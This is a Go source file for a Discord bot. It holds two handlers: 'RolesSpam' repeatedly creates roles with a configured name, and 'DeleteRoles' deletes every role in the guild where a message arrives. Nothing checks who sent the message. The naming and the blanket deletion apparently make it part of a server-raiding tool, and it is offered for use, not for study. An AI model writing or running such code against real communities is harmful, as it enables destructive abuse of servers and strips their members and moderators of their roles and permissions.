package creating

import (
	"fmt"
	"os"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

func RolesSpam(s *discordgo.Session, m *discordgo.MessageCreate) {
	godotenv.Load()
	ROLE_NAME := os.Getenv("ROLE_NAME")

	data := discordgo.RoleParams{
		Name: ROLE_NAME,
	}

	_, err := s.GuildRoleCreate(m.GuildID, &data)
	if err != nil {
		fmt.Println("Error creating role: ", err)
		return
	}
}

func DeleteRoles(s *discordgo.Session, m *discordgo.MessageCreate) {
	roles, _ := s.GuildRoles(m.GuildID)

	for _, role := range roles {
		s.GuildRoleDelete(m.GuildID, role.ID)
	}
}
